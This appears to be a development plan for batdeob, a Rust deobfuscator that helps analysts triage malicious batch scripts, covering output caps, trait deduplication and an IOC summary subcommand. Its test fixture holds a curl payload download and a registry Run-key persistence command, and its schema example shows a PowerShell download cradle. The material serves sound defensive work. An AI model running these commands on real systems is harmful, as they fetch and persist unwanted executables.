# batdeob Plan E — Output reduction + summary mode

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make `batdeob` produce analyst-friendly output by default. Plan D recovered 100 MB+ of payload from gated samples — great for completeness, terrible for triage. Plan E adds per-line caps, trait deduplication, refusal of arithmetic on unresolved expressions, and a new `summarize` subcommand that emits ONLY IOCs without the full deobfuscated text.

**Architecture:** No new modules. Per-line cap in `drive()`; trait dedup in `analyze()` finalization; arithmetic gate in `arith::eval`; new CLI subcommand wraps the existing report.

**Tech Stack:** Same as A-D.

**Spec:** `docs/superpowers/specs/2026-05-18-batdeob-rust-port-design.md`

**Prereq:** Plans A-D landed. 198 tests passing.

**Empirical findings from the v3 corpus run:**

| Issue | Evidence |
|---|---|
| 119 MB single-line outputs | `careus.bat` has 80 lines, 67 unique, but one SET accumulated >100 MB |
| 41,506 identical `ArithmeticParseError` events | One sample running set /a on `ans=03*((0xeca6c3%rscbXHc%...)` with unresolved `%var%` |
| 159K `AdminCommand` events | Useful but should dedup by command-name |
| 25K `IfNotResolved` events | Many of identical conditions; dedup |

---

## Task 1: `--max-output-line-bytes` per-line cap

**Impact:** Caps the largest single output line. Default 64 KB — enough for real PowerShell stagers, kills 100 MB+ blobs.

**Files:**
- Modify: `rust/crates/batdeob-core/src/env.rs` (Config + Limits)
- Modify: `rust/crates/batdeob-core/src/lib.rs` (`drive()` truncates each `normalized` before pushing to `out`)
- Modify: `rust/crates/batdeob-core/src/traits.rs` (new variant `LineTruncated { original_len: u64 }`)
- Modify: `rust/crates/batdeob-cli/src/main.rs` (flag on both `Deob` and `Analyze`)

- [ ] **Step 1: Add trait variant**

```rust
    LineTruncated { original_len: u64 },
```

- [ ] **Step 2: Add config field**

In `Config`:
```rust
    pub max_output_line_bytes: u64,
```
Default `64 * 1024` (64 KB). Add `max_output_line_bytes` to `Limits` too, populated by `Environment::new`.

- [ ] **Step 3: Add test**

```rust
#[cfg(test)]
mod line_cap_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;

    #[test]
    fn long_single_line_truncated() {
        // Build a single set line where the value is huge
        let val = "x".repeat(100_000);
        let script = format!("set Y={}\r\necho %Y%\r\n", val);
        let cfg = Config { max_output_line_bytes: 1024, ..Config::default() };
        let report = analyze(script.as_bytes(), &cfg);
        // No line in the output should exceed the cap (modulo small overhead for line terminator)
        for line in report.deobfuscated.lines() {
            assert!(line.len() <= 2048, "line too long: {} bytes", line.len());
        }
        let trunc = report.traits.iter().any(|t| matches!(t, Trait::LineTruncated { .. }));
        assert!(trunc, "no LineTruncated trait emitted");
    }
}
```

- [ ] **Step 4: Truncate in `drive()`**

Find where `out.push_str(&normalized); out.push_str("\r\n");` happens. Replace with:

```rust
            let normalized_capped = if normalized.len() as u64 > env.limits.max_output_line_bytes {
                let n = env.limits.max_output_line_bytes as usize;
                // Truncate on a char boundary
                let mut end = n.min(normalized.len());
                while end > 0 && !normalized.is_char_boundary(end) { end -= 1; }
                env.traits.push(crate::traits::Trait::LineTruncated {
                    original_len: normalized.len() as u64,
                });
                let mut s = normalized[..end].to_string();
                s.push_str("…[truncated]");
                s
            } else {
                normalized.clone()
            };
            out.push_str(&normalized_capped);
            out.push_str("\r\n");
```

Apply the same truncation to lines coming from `env.iter_output` if it accumulates per-iteration text.

- [ ] **Step 5: Wire CLI flag**

In both `Deob` and `Analyze`:
```rust
        #[arg(long, default_value_t = 64 * 1024)]
        max_output_line_bytes: u64,
```

Pass through `make_config()`.

- [ ] **Step 6: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo clippy --workspace --all-targets -- -D warnings 2>&1 | tail -5
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/
git commit -m "Add --max-output-line-bytes per-line cap (default 64 KB)"
```

---

## Task 2: Trait deduplication with `TraitsCapped` summary

**Impact:** 41K identical events become 1 event + 1 summary. JSON reports go from megabytes to kilobytes.

**Files:**
- Modify: `rust/crates/batdeob-core/src/traits.rs` (new variant `TraitsCapped`)
- Modify: `rust/crates/batdeob-core/src/lib.rs` (finalize step in `analyze()`)
- Modify: `rust/crates/batdeob-core/src/env.rs` (Config)

- [ ] **Step 1: Add trait variant**

```rust
    TraitsCapped { kind: String, total: u64, kept: u64 },
```

- [ ] **Step 2: Add config field**

```rust
    pub max_traits_per_kind: u32,
```

Default 100. In `Limits` too if it makes the plumbing easier; otherwise read from `cfg` directly in `analyze()` finalization.

- [ ] **Step 3: Add test**

```rust
#[cfg(test)]
mod trait_dedup_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;

    #[test]
    fn excess_arithmetic_events_get_deduped() {
        // 1000 set /a calls — should emit 100 (cap) + 1 TraitsCapped
        let mut script = String::new();
        for i in 0..1000 {
            script.push_str(&format!("set /a X={}+{}\r\n", i, i + 1));
        }
        let cfg = Config { max_traits_per_kind: 100, ..Config::default() };
        let report = analyze(script.as_bytes(), &cfg);
        let arith_count = report.traits.iter().filter(|t| matches!(t, Trait::Arithmetic { .. })).count();
        assert!(arith_count <= 100, "expected ≤100 Arithmetic events, got {}", arith_count);
        let capped = report.traits.iter().any(|t| matches!(t, Trait::TraitsCapped { kind, .. } if kind == "Arithmetic"));
        assert!(capped, "no TraitsCapped trait emitted");
    }
}
```

- [ ] **Step 4: Finalize in `analyze()`**

After `drive()` returns, before constructing `Report`, post-process `env.traits`:

```rust
fn dedup_traits(traits: &mut Vec<Trait>, max_per_kind: u32) {
    use std::collections::HashMap;
    // Count by kind
    let mut counts: HashMap<String, u64> = HashMap::new();
    for t in traits.iter() {
        let kind = trait_kind(t);
        *counts.entry(kind).or_insert(0) += 1;
    }
    // Keep only the first max_per_kind of each
    let mut kept: HashMap<String, u32> = HashMap::new();
    traits.retain(|t| {
        let kind = trait_kind(t);
        let n = kept.entry(kind.clone()).or_insert(0);
        if *n < max_per_kind {
            *n += 1;
            true
        } else {
            false
        }
    });
    // Append summary records for any kind that was capped
    for (kind, total) in counts {
        if total > max_per_kind as u64 {
            traits.push(Trait::TraitsCapped {
                kind,
                total,
                kept: max_per_kind as u64,
            });
        }
    }
}

fn trait_kind(t: &Trait) -> String {
    // Serde-friendly: serialize to a small Value and pick "kind"
    serde_json::to_value(t).ok()
        .and_then(|v| v.get("kind").and_then(|k| k.as_str()).map(|s| s.to_string()))
        .unwrap_or_default()
}
```

Call `dedup_traits(&mut env.traits, cfg.max_traits_per_kind);` in `analyze()` before `Report` construction.

- [ ] **Step 5: CLI flag**

Add `--max-traits-per-kind` to both subcommands, default 100.

- [ ] **Step 6: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo clippy --workspace --all-targets -- -D warnings 2>&1 | tail -5
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/
git commit -m "Add per-trait-kind cap (default 100) with TraitsCapped summary record"
```

---

## Task 3: Refuse `set /a` on expressions with unresolved `%var%`

**Impact:** 41,506 of the 55,048 `ArithmeticParseError` events come from ONE sample evaluating arithmetic on a string containing literal `%var%` text. The `set /a` evaluator currently parses the expression character-by-character; when it sees `%` it produces a parse error. Faster: pre-check the expression for unresolved sigils and skip evaluation entirely.

**Files:**
- Modify: `rust/crates/batdeob-core/src/handlers/set.rs`

The `do_set_a` function is where the arithmetic call happens. Add a pre-check:

- [ ] **Step 1: Add test**

```rust
#[cfg(test)]
mod set_a_unresolved_var_tests {
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;
    use crate::traits::Trait;

    #[test]
    fn set_a_with_unresolved_var_silently_skips() {
        let mut env = Environment::new(&Config::default());
        // The %SOMEVAR% is intentionally unresolved — the lexer would have left it
        // as a literal because we're passing through interpret_line directly
        // (not analyze). Construct the post-normalize line manually.
        interpret_line("set /a X=1+%UNDEF%", &mut env);
        // Neither Arithmetic (success) nor ArithmeticParseError should fire
        let has_arith = env.traits.iter().any(|t| matches!(t,
            Trait::Arithmetic { .. } | Trait::ArithmeticParseError { .. }
        ));
        assert!(!has_arith, "expected silent skip, got traits: {:?}", env.traits);
    }
}
```

Note: the test only works if the lexer/normalizer leaves `%UNDEF%` literal (because `UNDEF` is unset → empty → text becomes `set /a X=1+`). To test the unresolved case properly, bypass normalize:

Actually rethinking — after Plan A's normalize, `%UNDEF%` becomes empty, so the line passed to `interpret_line` is `set /a X=1+`. Whether that's an Arithmetic success or a ParseError depends on the parser. Let's instead test the more realistic case: a literal `%` in the input that survives normalize because the var name has spaces or is quoted oddly. Use `!UNDEF!` with `delayed_expansion = false`:

```rust
    #[test]
    fn set_a_with_bang_literal_silently_skips() {
        let mut env = Environment::new(&Config::default());
        // !UNDEF! is left literal when delayed_expansion is off
        env.delayed_expansion = false;
        // Manually emit what the lexer would: a set /a with %% literals
        interpret_line(r"set /a X=1+!UNDEF!", &mut env);
        let has_arith_err = env.traits.iter().any(|t| matches!(t,
            Trait::ArithmeticParseError { .. }
        ));
        assert!(!has_arith_err, "should silently skip, got: {:?}", env.traits);
    }
```

- [ ] **Step 2: Update `do_set_a` in `handlers/set.rs`**

Add a pre-check before calling `arith::eval`:

```rust
fn do_set_a(body: &str, env: &mut Environment) {
    let inner = if let Some(q) = quoted_form(body) {
        q.to_string()
    } else {
        body.to_string()
    };
    let inner = inner.trim();

    // Skip evaluation entirely if the expression contains unresolved sigils.
    // These will never be valid arithmetic.
    if inner.contains('%') || inner.contains('!') {
        return;
    }

    match arith::eval(inner, env) {
        Ok(value) => {
            env.traits.push(Trait::Arithmetic { expr: inner.to_string(), value });
        }
        Err(_) => {
            env.traits.push(Trait::ArithmeticParseError { expr: inner.to_string() });
        }
    }
}
```

- [ ] **Step 3: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/src/
git commit -m "set /a: silently skip expressions with unresolved %/! sigils"
```

---

## Task 4: `summarize` CLI subcommand

**Impact:** Analyst-friendly output. Emits high-level IOCs as a focused JSON document instead of the full deobfuscated text.

**Files:**
- Modify: `rust/crates/batdeob-cli/src/main.rs`

Output schema:

```json
{
  "input": "/path/to/script.bat",
  "input_size": 12345,
  "deobfuscated_size": 8901,
  "deobfuscated_preview": "<first 1000 chars of deobfuscated text>",
  "downloads": [
    {"src": "http://...", "dst": "out.exe", "tool": "curl"}
  ],
  "extracted": {
    "cmd": 3,
    "powershell": 1,
    "vbs": 0,
    "jscript": 0,
    "powershell_samples": ["IEX (New-Object Net.WebClient)..."]
  },
  "lolbas": ["certutil", "bitsadmin"],
  "admin_commands": {"reg": 5, "del": 2, "taskkill": 1},
  "self_extract": true,
  "windows_util_manipulation": [...],
  "traits_capped": []
}
```

- [ ] **Step 1: Add `Summarize { file: String }` variant** to the `Command` enum

- [ ] **Step 2: Write the summarize logic**

In `main.rs`:

```rust
fn build_summary(input_path: &str, input: &[u8], report: &batdeob_core::Report) -> serde_json::Value {
    use batdeob_core::Trait;
    use std::collections::BTreeMap;

    let mut downloads = Vec::new();
    let mut lolbas: Vec<String> = Vec::new();
    let mut admin_commands: BTreeMap<String, u64> = BTreeMap::new();
    let mut ps_samples: Vec<String> = Vec::new();
    let mut windows_util: Vec<serde_json::Value> = Vec::new();
    let mut self_extract = false;
    let mut traits_capped: Vec<serde_json::Value> = Vec::new();

    for t in &report.traits {
        match t {
            Trait::Download { src, dst, .. } | Trait::CertutilDownload { url: src, dst } | Trait::BitsadminDownload { url: src, dst } => {
                downloads.push(serde_json::json!({
                    "src": src,
                    "dst": dst,
                }));
            }
            Trait::Lolbas { name, .. } => {
                if !lolbas.iter().any(|n| n == name) { lolbas.push(name.clone()); }
            }
            Trait::AdminCommand { name, .. } => {
                *admin_commands.entry(name.clone()).or_insert(0) += 1;
            }
            Trait::SelfExtract { .. } => { self_extract = true; }
            Trait::WindowsUtilManip { src, dst, .. } => {
                windows_util.push(serde_json::json!({"src": src, "dst": dst}));
            }
            Trait::TraitsCapped { .. } | Trait::LineTruncated { .. } | Trait::OutputCapped { .. }
            | Trait::DepthCapped { .. } | Trait::ChildScriptsCapped | Trait::TimeoutHit
            | Trait::IterationCapped { .. } => {
                traits_capped.push(serde_json::to_value(t).expect("trait serializes"));
            }
            _ => {}
        }
    }

    let ps_count = report.extracted_ps1.len();
    for ps in report.extracted_ps1.iter().take(3) {
        let s = String::from_utf8_lossy(ps);
        ps_samples.push(s.chars().take(500).collect());
    }

    let preview: String = report.deobfuscated.chars().take(1000).collect();

    serde_json::json!({
        "input": input_path,
        "input_size": input.len(),
        "deobfuscated_size": report.deobfuscated.len(),
        "deobfuscated_preview": preview,
        "downloads": downloads,
        "extracted": {
            "cmd": report.extracted_cmd.len(),
            "powershell": ps_count,
            "powershell_samples": ps_samples,
        },
        "lolbas": lolbas,
        "admin_commands": admin_commands,
        "windows_util_manipulation": windows_util,
        "self_extract": self_extract,
        "traits_capped": traits_capped,
    })
}
```

- [ ] **Step 3: Wire dispatch**

In `run()`'s match block:

```rust
        Command::Summarize { file } => {
            let input = read_input(&file)?;
            let cfg = batdeob_core::Config::default();
            let report = batdeob_core::analyze(&input, &cfg);
            let summary = build_summary(&file, &input, &report);
            println!("{}", serde_json::to_string_pretty(&summary)?);
        }
```

- [ ] **Step 4: Integration test**

Append to `rust/crates/batdeob-cli/tests/cli.rs`:

```rust
#[test]
fn summarize_emits_compact_report() {
    let dir = TempDir::new().expect("tmp");
    let input = dir.path().join("in.bat");
    fs::write(&input, "curl -o out.exe http://x/y.exe\r\nreg add HKLM\\Run /v Evil /d \"C:\\\\evil.exe\"\r\n").expect("write");
    let out = Command::cargo_bin("batdeob")
        .expect("bin")
        .args(["summarize", input.to_str().expect("path")])
        .output()
        .expect("run");
    assert!(out.status.success(), "stderr: {}", String::from_utf8_lossy(&out.stderr));
    let s = String::from_utf8_lossy(&out.stdout);
    let v: serde_json::Value = serde_json::from_str(&s).expect("valid json");
    // Should have downloads and admin_commands populated
    assert!(v["downloads"].as_array().expect("downloads").len() >= 1);
    assert!(v["admin_commands"]["reg"].as_u64().expect("reg count") >= 1);
}
```

- [ ] **Step 5: Verify + commit**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -10
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-cli/
git commit -m "Add summarize subcommand: focused IOC report without raw deob text"
```

---

## Task 5: Final corpus v4 + comparison

After Tasks 1-4 land, validate the wins.

- [ ] **Step 1: Build release + re-run corpus**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo build --release 2>&1 | tail -3

sed 's|corpus_results_v3|corpus_results_v4|g' /tmp/corpus_run_v3.sh > /tmp/corpus_run_v4.sh
chmod +x /tmp/corpus_run_v4.sh
mkdir -p /tmp/corpus_results_v4
rm -rf /tmp/corpus_results_v4/* 2>/dev/null
timeout 1800 /tmp/corpus_run_v4.sh > /tmp/corpus_run_v4.log 2>&1
wc -l /tmp/corpus_results_v4/index.jsonl
```

- [ ] **Step 2: Compare v3 vs v4**

Same Python comparison as Plan D Task 7, but v3→v4:

```python
import json
from pathlib import Path
from collections import Counter

def load(d):
    out = {}
    p = Path(d) / "index.jsonl"
    if not p.exists(): return out
    for line in p.read_text().splitlines():
        try: r = json.loads(line); out[r["sha"]] = r
        except: pass
    return out

v3 = load("/tmp/corpus_results_v3")
v4 = load("/tmp/corpus_results_v4")

def summary(by_sha, name):
    n = len(by_sha)
    succ = sum(1 for r in by_sha.values() if r["rc"] == 0)
    avg = sum(r["out_size"] for r in by_sha.values() if r["rc"]==0) / max(1, succ)
    med = sorted(r["out_size"] for r in by_sha.values() if r["rc"]==0)
    med = med[len(med)//2] if med else 0
    mx = max((r["out_size"] for r in by_sha.values() if r["rc"]==0), default=0)
    print(f"{name}: total={n} success={succ} ({100*succ/n:.1f}%) avg={avg:.0f} med={med} max={mx}")

summary(v3, "v3 (Plan D end)")
summary(v4, "v4 (Plan E end)")

# Trait deltas
def trait_counts(d, by_sha):
    cnt = Counter()
    for r in by_sha.values():
        if r["rc"] != 0: continue
        p = Path(d) / f"{r['sha']}.json"
        if not p.exists(): continue
        try:
            for t in json.loads(p.read_text(errors='replace')).get("traits", []):
                cnt[t.get("kind","")] += 1
        except: pass
    return cnt

c_v3 = trait_counts("/tmp/corpus_results_v3", v3)
c_v4 = trait_counts("/tmp/corpus_results_v4", v4)
print("\nTrait counts (v3 → v4):")
all_k = set(c_v3) | set(c_v4)
for k in sorted(all_k, key=lambda x: -max(c_v3[x], c_v4[x]))[:25]:
    print(f"  {k:28} {c_v3[k]:>8} → {c_v4[k]:>8}")
```

Target deltas:
- `ArithmeticParseError`: 55K → < 200 (refused at the gate)
- max output size: 119 MB → < 4 MB (line cap kicks in)
- Trait event total: dramatic reduction (most kinds capped at 100)

- [ ] **Step 3: Run a representative `summarize` on a real sample** for human inspection:

```bash
./target/release/batdeob summarize "/home/coz/cstorage/mbzdls/SKMBT28736292.bat" | head -50
./target/release/batdeob summarize "/home/coz/cstorage/mbzdls/?impactfulbrands.co.uk__________________________________________.html.bat" | head -50
```

- [ ] **Step 4: Commit summary**

```bash
cd /home/coz/Downloads/batch_deobfuscator
git commit --allow-empty -m "Plan E complete: v4 corpus results [paste table]"
```

## Report

- v3 vs v4 table
- Largest output drop
- ArithmeticParseError reduction
- `summarize` output for the two example samples (truncated to first 30 lines)
- Commit SHA of the completion marker

---

## Self-review

- **Spec coverage**: per-line cap (corpus 119 MB problem), trait dedup (41K events problem), set /a gate (41K parse-error problem), summarize subcommand (user's literal ask). ✓
- **Placeholders**: none.
- **Type consistency**: `Trait::LineTruncated` and `TraitsCapped` are new — added in Task 1 and 2. Used in their respective tasks only.
- **Risk**: Task 4's `build_summary` builds a struct from the post-dedup traits. If dedup removed individual `Download` events, the summary's `downloads` list shrinks too. That's likely fine — downloads dedup is appropriate.

**Plan E complete.** Execute via `superpowers:subagent-driven-development`.
